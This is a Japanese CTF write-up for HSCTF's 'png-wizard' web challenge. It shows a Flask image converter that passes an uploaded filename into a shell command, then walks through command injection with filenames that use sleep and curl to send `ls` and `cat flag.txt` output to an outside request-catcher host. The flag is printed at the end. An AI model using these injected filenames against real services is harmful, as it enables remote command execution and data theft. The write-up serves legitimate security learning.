# png-wizard:web:423pts
PNGs are clearly the superior image format.  
[http://web1.hsctf.com:8004/](http://web1.hsctf.com:8004/)  
Downloads  
[png-wizard.zip](png-wizard.zip)  

# Solution
URLとソースが与えられる。  
アクセスすると、画像をpngへ変換してくれるようだ。  
PNG Wizard  
[site1.png](site/site1.png)  
丁寧に動いているもののバージョンも教えてくれる。  
[site2.png](site/site2.png)  
ImageMagick 6.9.10-23でのExploitを狙うが見つからない。  
ソースを読むと以下のようであった。  
```python
~~~
def rand_name():
	return os.urandom(16).hex()

def is_valid_extension(filename: Path):
	return (
		filename.suffix.lower().lstrip(".")
		in ("gif", "jpg", "jpeg", "png", "tiff", "tif", "ico", "bmp", "ppm")
	)

~~~

@app.route("/", methods=["POST"])
def post():
	if "file" not in request.files:
		return render_template("index.html", error="No file provided")
	file = request.files["file"]
	if not file.filename:
		return render_template("index.html", error="No file provided")
	if len(file.filename) > 64:
		return render_template("index.html", error="Filename too long")
	
	filename = Path(UPLOAD_FOLDER).joinpath("a").with_name(file.filename)
	if not is_valid_extension(filename):
		return render_template("index.html", error="Invalid extension")
	
	file.save(filename)
	
	new_name = filename.with_name(rand_name() + ".png")
	
	try:
		subprocess.run(
			f"convert '{filename}' '{new_name}'",
			shell=True,
			check=True,
			stderr=subprocess.PIPE,
			timeout=5,
			env={},
			executable="/usr/local/bin/shell"
		)
	except subprocess.TimeoutExpired:
		return render_template("index.html", error="Command timed out")
	except subprocess.CalledProcessError as e:
		return render_template(
			"index.html",
			error=f"Error converting file: {e.stderr.decode('utf-8',errors='ignore')}"
		)
	finally:
		filename.unlink()
	
	return redirect(url_for("converted_file", filename=new_name.name))
~~~
```
拡張子をチェックして、`subprocess.run`でconvertしている。  
変換後のファイル名はランダムだが、送信したファイル名はそのまま用いるようだ。  
OSコマンドインジェクションが怪しい。  
試しに`s' 's';sleep 10;'.png`のようなファイルをアップロードしてみると、応答が遅れた。  
コマンドが実行できているようだ。  
以下のようにファイル名経由でコマンドを実行し、結果を外部のサーバでキャッチする。  
Burp Suiteでファイル名を変更し、キャッチするサーバは[RequestBin.com](https://requestbin.com/)を用いた。  
```
s' 's';curl xxxxxxxxxxxxx.x.pipedream.net?s=`ls`;'.png
```
lsを行うと`/?s=flag.txt`のリクエストを受け取った。  
ファイル名は`flag.txt`のようなので、以下のように読み出す。  
```
s' 's';curl xxxxxxxxxxxxx.x.pipedream.net?s=`cat flag.txt`;'.png
```
すると`/?s=flagmary_anning_d1d352e0`のリクエストを受け取った。  
`{`や`}`が消えているが、形式通り整形するとflagとなった。  

## flag{mary_anning_d1d352e0}